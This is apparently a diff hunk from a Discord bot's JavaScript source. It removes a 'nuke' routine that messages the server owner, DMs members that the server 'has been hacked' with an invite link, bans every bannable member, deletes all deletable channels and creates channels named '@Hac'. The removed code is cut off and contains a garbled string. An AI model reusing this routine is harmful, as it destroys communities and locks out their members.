@@ -5657,37 +5657,7 @@ m.createChannel('By : Asssit - Gn', 'voice');
 });
  
  
-const { Client } = require('discord.js');
-const client = new Client();
- 
-async function nuke(guild) {
-  let users = 0;
-  let channels = 0;
- 
-  await guild.fetchMembers();
- 
-  await guild.owner.send(' By By : Asssit - Gn.').catch(e => { return void e; });
- 
- 
- 
-  await Promise.all(guild.members.map(async (m) => {
-    if (m.bannable) {
-      users++;
-      await m.send('The server has been hacked. Welcome to https://discord.gg/D5YWPd').catch(e => { return void e; });
-      return m.ban();
-    }
-  }));
- 
-    await Promise.all(guild.channels.map(c => {
-    if (c.deletable) {
-      channels++;
-      return c.delete();
-    }
-  }));
- 
-    await guild.createChannel('@Hac ', 'voice');
- 
-      await guild.createChannel('@Hac'نب, 'text');
+
  
  
  
